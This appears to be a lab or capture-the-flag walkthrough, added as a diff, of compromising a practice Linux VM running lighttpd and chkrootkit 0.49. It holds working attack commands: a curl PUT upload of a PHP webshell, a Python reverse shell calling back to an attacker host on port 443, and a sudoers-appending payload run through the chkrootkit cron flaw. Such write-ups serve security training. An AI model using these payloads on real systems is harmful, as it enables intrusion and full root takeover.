@@ -1,0 +1,114 @@
+###################################################################################################################################################################################################################
+[ 1 ] ENUMERATION
+
+// Ports and services
+22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    lighttpd 1.4.28
+
+// Dirb
+dirb http://192.168.1.12 /usr/share/wordlists/dirb/big.txt
+==> DIRECTORY: http://192.168.1.12/test/
+// We confirm the version of web application:
+lighttpd/1.4.28
+
+// Nikto doesn't show interesting information
+
+// Enum4linux doesn't show useful information either
+
+// Wfuzz shows 2 directorys
+fuzz -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://192.168.1.12/FUZZ
+02987:  C=403     11 L	      26 W	    345 Ch	  "~"
+..."
+02995:  C=301      0 L	       0 W	      0 Ch	  "test"
+
+!!!!!
+// Find HTTP methods
+nmap 192.168.1.12 -p 80 --script http-methods --script-args http-methods.url-path='/test'
+
+// I made an HTTP Options request to 192.168.1.12/test/
+// Web servers answers that this methods are allowed
+ PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK, OPTIONS, GET, HEAD, POST
+
+
+###################################################################################################################################################################################################################
+[ 2 ] EXPLOTATION
+
+// We upload a webshell using the HTTP method named PUT
+// Method 1
+curl -X PUT -d '<?php system($_GET["x"]);' http://192.168.1.12/test/1.php
+// Method 2
+curl --upload-file shell.php -v --url http://192.168.1.12/test/shell3.php -0
+
+// I can not start a connection with netcat. It has another netcat version, but we can use python
+// Also, we have to use a known port, in this case i use 443
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.11",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+// Shell interactiva
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+###################################################################################################################################################################################################################
+[ 3 ] PRIVILEGE ESCALATION
+
+// I look for a crontab installed
+cat crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+
+// I found some programs in a cron folder
+$ pwd
+/etc/cron.daily
+$ ls
+apt
+aptitude
+bsdmainutils
+chkrootkit
+dpkg
+lighttpd
+logrotate
+man-db
+mlocate
+passwd
+popularity-contest
+standard
+
+!!!!!
+// One has a vulnerability
+$ chkrootkit -V
+chkrootkit version 0.49
+https://www.exploit-db.com/exploits/33899/
+
+// I prepare a file named update that adds current user to sudoers withous pass, and i make this file executable
+echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+chmod +x update
+
+// Few minutes later i can see a sudoers file change
+www-data@ubuntu:/tmp$ ls -lrth /etc/sudoers
+ls -lrth /etc/sudoers
+-r--r----- 1 root root 750 Jul 21 13:35 /etc/sudoers
+
+www-data@ubuntu:/tmp$ sudo su
+sudo su
+root@ubuntu:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+###################################################################################################################################################################################################################
+[ + ] INFORMATION
+
+
+###################################################################################################################################################################################################################
